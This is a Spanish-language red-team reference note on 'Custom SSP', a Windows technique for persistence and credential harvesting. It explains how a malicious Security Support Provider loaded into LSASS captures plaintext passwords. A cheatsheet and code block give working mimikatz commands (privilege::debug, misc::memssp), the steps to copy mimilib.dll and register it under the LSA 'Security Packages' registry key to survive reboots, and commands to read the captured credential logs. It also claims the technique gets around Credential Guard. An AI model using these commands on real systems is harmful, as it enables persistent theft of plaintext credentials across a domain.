---
aliases:
  - Custom SSP
  - Malicious SSP
  - memssp
tags:
  - technique/persistence
  - technique/credential-access
  - asset/active-directory
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: Technique
linked:
  - "[[Skeleton Key]]"
  - "[[LSASS Dumping]]"
  - "[[Credential Guard Bypass]]"
---
# Custom SSP

Un **Security Support Provider** (SSP) es un DLL que Windows carga en LSASS para manejar autenticación (NTLM, Kerberos, etc.). Registrar un **SSP malicioso** hace que LSASS le pase **cada credencial en texto plano** en el momento del login → captura de passwords clear-text persistente, incluso de cuentas que nunca dumpeás.

Dos variantes: en memoria (`mimikatz misc::memssp`, se pierde al reiniciar) o en disco (`mimilib.dll` + registro, persistente). Funciona en cualquier host (DC, server, workstation).

---

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `mimikatz # misc::memssp` | Inyecta SSP en memoria → loguea logins en `C:\Windows\System32\mimilsa.log` | Captura rápida, no persiste reboot. |
| Copiar `mimilib.dll` a `%SystemRoot%\System32\` | DLL del SSP en disco | Persistencia. |
| `reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages"` | Ver SSPs registrados | Recon / confirmar. |
| `reg add ...\Lsa /v "Security Packages" /d "kerberos\0...\0mimilib\0" /t REG_MULTI_SZ` | Registrar `mimilib` como SSP (carga al boot) | Persistencia tras reinicio. |
| `type C:\Windows\System32\mimilsa.log` / `kiwissp.log` | Leer las credenciales capturadas | Recolección. |

```text
:: En memoria (volátil, no requiere reboot) — admin/SYSTEM ::
mimikatz # privilege::debug
mimikatz # misc::memssp
:: Cada login posterior → C:\Windows\System32\mimilsa.log en texto plano

:: Persistente en disco ::
copy mimilib.dll %SystemRoot%\System32\
:: Agregar "mimilib" a Security Packages (REG_MULTI_SZ) y reiniciar
```

---

## Overview

A diferencia de dumpear LSASS (snapshot de lo que hay *ahora*), un Custom SSP **captura credenciales a medida que llegan** — incluye cuentas que se loguean después de instalarlo, contraseñas de servicios al reiniciar, y admins que pasan por el host. En un DC, captura prácticamente toda autenticación interactiva.

**Ventaja vs Credential Guard:** CredGuard protege los secretos *en reposo* en LSAIso, pero el SSP intercepta la credencial **antes** de ese aislamiento (en el flujo de autenticación) → sigue capturando texto plano → ver [[Credential Guard Bypass]].

> [!warning] Requiere admin/SYSTEM
> Inyectar un SSP necesita privilegios altos en el host. Es persistencia/credential-harvesting post-compromiso.

> [!tip] memssp vs mimilib
> `memssp` = rápido, en memoria, se pierde al reiniciar (bueno para captura puntual). `mimilib.dll` + registro = persistente entre reboots (backdoor real). Ambos escriben el log en texto plano local.

---

## Recursos

- [adsecurity.org — Custom SSP persistence](https://adsecurity.org/?p=1760) — Sean Metcalf.
- [The Hacker Recipes — SSP](https://www.thehacker.recipes/ad/persistence/ssp) — memssp y mimilib.
